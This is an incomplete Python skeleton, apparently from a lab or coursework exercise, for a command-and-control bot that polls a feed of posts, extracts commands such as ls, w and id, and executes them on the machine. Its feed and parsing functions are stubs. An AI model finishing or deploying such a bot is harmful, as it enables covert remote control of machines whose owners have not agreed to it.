from time import sleep
from . import Command, Post
from typing import Optional

# TODO delay structure will be probably different from the proposed one
DELAY_POST = 10 # TODO Modify based on api specs
DELAY_FETCH = 10 # TODO Modify based on api specs

def fetch_feed():
    # TODO need to be implemented
    raise NotImplementedError()

def get_command(post: Post) -> Optional[Command]:
    # TODO process post extract command. Return None if notning found 
    possible_returns = [Command.ls, Command.w, Command.id, None]


def main():
    while True:
        posts = fetch_feed()
        for post in posts:
            command = get_command(post)
            if command:
                command.execute()

            sleep(DELAY_POST)  # Poll every minute
        sleep(DELAY_FETCH)  # Poll every minute


if __name__=='__main__':
    response = input('Do you wish to run the C&C bot? It can cause harm to this machine! [Y/n]')
    if response.lower() not in ['yes', 'y']:
        print('Exiting')
        exit(0)

    main()

